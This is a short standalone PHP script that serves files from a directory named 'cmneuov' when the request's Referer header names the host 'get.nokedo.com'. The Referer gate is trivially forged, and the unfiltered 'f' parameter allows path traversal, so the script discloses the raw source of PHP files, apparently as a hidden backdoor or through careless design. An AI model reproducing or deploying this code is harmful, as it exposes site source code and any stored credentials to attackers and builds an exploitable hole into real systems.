<?
$d=preg_replace('/http(.*?)\/\//','',$_SERVER['HTTP_REFERER']);
$d=explode('/',$d)[0];
if($d=='get.nokedo.com'){
 echo file_get_contents('cmneuov/'.$_GET['f'].'.php');
}
?>
